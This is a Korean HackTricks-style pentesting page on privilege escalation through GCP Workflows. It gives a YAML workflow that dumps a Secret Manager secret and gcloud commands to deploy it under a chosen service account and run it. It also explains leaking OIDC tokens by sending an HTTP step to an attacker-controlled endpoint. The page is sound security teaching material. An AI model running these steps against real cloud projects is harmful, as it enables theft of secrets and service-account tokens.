# GCP - Workflows Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Workflows

기본 정보:

{{#ref}}
../gcp-services/gcp-workflows-enum.md
{{#endref}}

### `workflows.workflows.create`, `iam.serviceAccounts.ActAs`, `workflows.executions.create`, (`workflows.workflows.get`, `workflows.operations.get`)

내가 아는 한, Workflow에 연결된 SA 자격 증명을 포함하는 메타데이터 엔드포인트에 접근하여 쉘을 얻는 것은 불가능하다. 그러나 Workflow 내에서 수행할 작업을 추가하여 SA의 권한을 악용하는 것은 가능하다.

커넥터의 문서를 찾는 것이 가능하다. 예를 들어, 이것은 [**Secretmanager 커넥터의 페이지**](https://cloud.google.com/workflows/docs/reference/googleapis/secretmanager/Overview)**입니다.** 사이드 바에서 여러 다른 커넥터를 찾을 수 있다.

여기 비밀을 출력하는 커넥터의 예를 찾을 수 있다:
```yaml
main:
params: [input]
steps:
- access_string_secret:
call: googleapis.secretmanager.v1.projects.secrets.versions.accessString
args:
secret_id: secret_name
version: 1
project_id: project-id
result: str_secret
- returnOutput:
return: "${str_secret}"
```
CLI에서 업데이트:
```bash
gcloud workflows deploy <workflow-name> \
--service-account=email@SA \
--source=/path/to/config.yaml \
--location us-central1
```
`ERROR: (gcloud.workflows.deploy) FAILED_PRECONDITION: Workflows service agent does not exist`와 같은 오류가 발생하면, **1분 정도 기다렸다가 다시 시도**하세요.

웹 접근이 없는 경우, 다음을 사용하여 Workflow의 실행을 트리거하고 볼 수 있습니다:
```bash
# Run execution with output
gcloud workflows run <workflow-name> --location us-central1

# Run execution without output
gcloud workflows execute <workflow-name> --location us-central1

# List executions
gcloud workflows executions list <workflow-name>

# Get execution info and output
gcloud workflows executions describe projects/<proj-number>/locations/<location>/workflows/<workflow-name>/executions/<execution-id>
```
> [!CAUTION]
> 이전 실행의 출력을 확인하여 민감한 정보를 찾을 수도 있습니다.

권한이 없기 때문에 `PERMISSION_DENIED: Permission 'workflows.operations.get' denied on...`와 같은 오류가 발생하더라도, 워크플로우는 생성되었습니다.

### OIDC 토큰 유출 (및 OAuth?)

[**문서에 따르면**](https://cloud.google.com/workflows/docs/authenticate-from-workflow) 워크플로우 단계에서 OAuth 또는 OIDC 토큰으로 HTTP 요청을 보낼 수 있습니다. 그러나 [Cloud Scheduler](gcp-cloudscheduler-privesc.md)와 마찬가지로, Oauth 토큰을 포함한 HTTP 요청은 호스트 `.googleapis.com`으로 보내야 합니다.

> [!CAUTION]
> 따라서, **사용자가 제어하는 HTTP 엔드포인트를 지정하여 OIDC 토큰을 유출할 수 있습니다**. 그러나 **OAuth** 토큰을 유출하려면 **그 보호를 우회해야** 합니다. 그러나 여전히 **연결기 또는 OAuth 토큰을 사용한 HTTP 요청을 통해 SA를 대신하여 GCP API에 연락할 수 있습니다.**

#### Oauth
```yaml
- step_A:
call: http.post
args:
url: https://compute.googleapis.com/compute/v1/projects/myproject1234/zones/us-central1-b/instances/myvm001/stop
auth:
type: OAuth2
scopes: OAUTH_SCOPE
```
#### OIDC
```yaml
- step_A:
call: http.get
args:
url: https://us-central1-project.cloudfunctions.net/functionA
query:
firstNumber: 4
secondNumber: 6
operation: sum
auth:
type: OIDC
audience: OIDC_AUDIENCE
```
### `workflows.workflows.update` ...

이 권한을 사용하면 `workflows.workflows.create` 대신 이미 존재하는 워크플로를 업데이트하고 동일한 공격을 수행할 수 있습니다.

{{#include ../../../banners/hacktricks-training.md}}
